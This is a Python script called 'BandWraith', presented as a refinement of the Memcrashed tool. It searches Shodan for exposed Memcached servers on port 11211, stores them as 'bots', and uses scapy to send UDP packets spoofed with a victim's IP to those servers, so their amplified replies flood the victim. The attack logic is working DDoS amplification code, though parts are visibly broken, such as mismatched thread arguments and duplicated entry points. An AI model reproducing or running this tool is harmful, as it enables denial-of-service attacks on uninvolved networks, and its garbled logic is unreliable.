# BandWraith
# Author Wayne Kenney Jr. - Refined Memcrashed coding, with multiple function definitions. No longer 100% procedural coded... 

import shodan
import sys, os, time, shodan
from pathlib import Path
from scapy.all import *
show_interfaces()
from contextlib import contextmanager, redirect_stdout
import threading
import time

starttime = time.time()

your_key = Path("./api.txt")

def load_shodan_api_key():
    global SHODAN_API_KEY
    your_key = Path('api.txt')
    if your_key.is_file():
        with open('api.txt', 'r') as file:
            SHODAN_API_KEY = file.readline().rstrip('\n')
    else:
        with open('api.txt', 'w') as file:
            SHODAN_API_KEY = input('[*] Please enter a valid Shodan.io API Key: ')
            file.write(SHODAN_API_KEY)
            print('[~] File written: ./api.txt')
    return SHODAN_API_KEY

def search_shodan(api_key):
    global results
    api = shodan.Shodan(api_key)
    print('\n[*] Use Shodan API to search for affected BandWraith servers? <Y/n>: ', end='')
    query = input().lower()
    if query.startswith('y'):
        print('[~] Checking Shodan.io API Key: %s' % api_key)
        results = api.search('product:"Memcached" port:11211')
        print('[✓] API Key Authentication: SUCCESS')
        print('[~] Number of bots: %s' % results['total'])
        return results
    return None

def save_results(results):
    print('[*] Save results for later usage? <Y/n>: ', end='')
    saveresult = input().lower()
    if saveresult.startswith('y') and results:
        with open('bots.txt', 'a') as file2:
            for result in results['matches']:
                file2.write(result['ip_str'] + "\n")
        print('[~] File written: ./bots.txt')

def load_local_bots():
    myresults = Path("./bots.txt")
    if myresults.is_file():
        with open('bots.txt') as my_file:
            ip_list = [line.strip() for line in my_file.readlines()]
        return ip_list
    else:
        print('[✘] Error: No bots stored locally, bots.txt file not found!')
    return []

def prepare_attack():
    #global target
    target = input("[▸] Enter target IP address: ")
    targetport = input("[▸] Enter target port number (Default 80): ") or "80"
    power = int(input("[▸] Enter preferred power (Default 1): ") or "1")
    data = input("[+] Enter payload contained inside packet: ") or "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"
    setdata, getdata = None, None
    if (data != "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"):
        setdata = ("\x00\x00\x00\x00\x00\x00\x00\x00set\x00injected\x000\x003600\x00%s\r\n%s\r\n" % (len(data)+1, data))
        getdata = ("\x00\x00\x00\x00\x00\x00\x00\x00get\x00injected\r\n")
        print("[+] Payload transformed: set injected and get injected")
    return target, targetport, power, data, setdata, getdata

def display_bots(api_key, ip_list=None):
    api = shodan.Shodan(api_key)
    counter = 0
    for x in (ip_list or []):
        host = api.host('%s' % x)
        counter += 1
        print('[+] BandWraith Server (%d) | IP: %s | OS: %s | ISP: %s |' % (counter, x, host.get('os', 'n/a'), host.get('org', 'n/a')))
        time.sleep(1.1 - ((time.time() - starttime) % 1.1))

from scapy.all import send, IP, UDP, Raw

import sys
from scapy.all import send, IP, UDP, Raw

def send_udp_packet(target, target_port, data, power, iface=None):
    try:
        print(f'[Thread {threading. current_thread(). name}] Started for target: {target}')
        # Simulate work with sleep
        time. sleep(1)  # Placeholder for the actual send logic
        dst_ip = target  # Use the target IP directly
        
        print(f"[Thread {target}] Started for target: {target}")
        if data != "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n":
            # For custom data, potentially send set and get commands
            if setdata and getdata:
                print(f'[+] Sending 2 forged synchronized payloads to: {dst_ip}')
                send(IP(src=target, dst=dst_ip) / UDP(sport=int(target_port), dport=11211) / Raw(load=setdata), count=1, iface=iface)
                send(IP(src=target, dst=dst_ip) / UDP(sport=int(target_port), dport=11211) / Raw(load=getdata), count=power, iface=iface)
        else:
            # For default data, send directly
            message = f'[+] Sending {power} forged UDP packet(s) to: {dst_ip}'
            print(message)
            send(IP(src=target, dst=dst_ip) / UDP(sport=int(target_port), dport=11211) / Raw(load=data), count=power, iface=iface)
            print(f'[Thread {threading. current_thread(). name}] Finished for target: {target}')
    except Exception as e:
        print(f'[Thread {threading. current_thread(). name}] Error: {e}')


def main():
    global SHODAN_API_KEY
    target, target_port, power, data, setdata, getdata = prepare_attack()
    #target, target_port, power, data = "127. 0. 0. 1", 80, 10, "data"
    print('[*] Ready to engage target %s? <Y/n>: ' % target, end='')
    engage = input(). lower()
    load_shodan_api_key()
    results = search_shodan(SHODAN_API_KEY)
    if engage. startswith('y'):
        threads = []
        iface = 'Atheros AR9271 Wireless Network Adapter'  # Specify the interface outside the loop
        ip_list = [result['ip_str'] for result in results['matches']]
    for _ in ip_list:  # Loop over ip_list without using the ip variable
        thread = threading.Thread(target=send_udp_packet, args=(target_port, data, power, setdata, getdata, iface))
        threads.append(thread)
        thread.start()

        # Wait for all threads to complete
        for thread in threads:
            thread. join()
            print('[•] Task complete! Exiting Platform.  Have a wonderful day. ')
            
        print('')
        print('[•] Task complete! Exiting Platform.  Have a wonderful day. ')
    else:
        print('')
        print('[✘] Error: %s not engaged!' % target)
        print('[~] Restarting Platform! Please wait. ')
        print('')
     
if __name__ == "__main__":
    main()


    
if __name__ == "__main__":
    main()